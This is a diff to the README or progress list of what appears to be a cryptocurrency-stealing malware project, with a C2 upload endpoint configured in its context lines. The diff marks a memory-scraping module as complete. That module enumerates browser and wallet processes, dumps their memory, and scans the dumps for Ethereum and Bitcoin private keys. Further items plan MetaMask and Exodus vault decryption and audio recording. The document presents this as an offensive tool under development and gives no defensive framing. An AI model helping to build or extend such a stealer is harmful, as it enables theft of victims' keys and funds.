@@ -17,6 +17,27 @@ export HMM_TRANSPORT_ENDPOINT="https://your-c2-server.com/upload"
 export HMM_TRANSPORT_API_KEY="your-api-key"
 ```
 
+## Memory Extraction Module
+
+- [x] Process enumeration (find MetaMask/Chrome/Electron processes)
+- [x] Memory dumping (ReadProcessMemory / procfs)
+- [x] Pattern scanning (search for key formats)
+- [x] String extraction + entropy filtering
+- [x] Key validation (checksum verification)
+
+**Features:**
+- Scans Chrome, Firefox, Brave, Edge, Electron processes
+- Detects Ethereum keys (64 hex chars)
+- Detects Bitcoin WIF keys (51-52 base58 chars)
+- High-entropy string detection (potential encrypted keys/seeds)
+- Confidence scoring (Low/Medium/High)
+- Linux and Windows support
+
+**Checksum Verification:**
+- Bitcoin WIF: Double SHA256 checksum verification
+- Ethereum: secp256k1 curve order range validation [1, n-1]
+- Base58 decoding with invalid character detection
+
     Wallet Decryption
      - [ ] MetaMask vault decryption (needs DPAPI + user password)
      - [ ] Exodus wallet decryption
@@ -54,14 +75,3 @@ export HMM_TRANSPORT_API_KEY="your-api-key"
      - [ ] Audio recording (stub)
 
     ---
-
- Remaining for Memory Extraction
-
-    To add memory scraping, you'd need:
-
-     1 Memory Extraction Module:
-     2   - [ ] Process enumeration (find MetaMask/Chrome/Electron processes)
-     3   - [ ] Memory dumping (ReadProcessMemory / procfs)
-     4   - [ ] Pattern scanning (search for key formats)
-     5   - [ ] String extraction + entropy filtering
-     6   - [ ] Key validation (checksum verification)
